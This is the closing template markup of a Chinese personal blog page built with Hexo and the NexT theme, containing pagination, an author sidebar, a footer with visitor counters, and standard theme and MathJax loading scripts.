  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="hxt"
      src="/images/hxt.jpg">
  <p class="site-author-name" itemprop="name">hxt</p>
  <div class="site-description" itemprop="description">May the Force be with you.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">92</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">27</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">54</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hxt</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">177k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">2:41</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>


    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
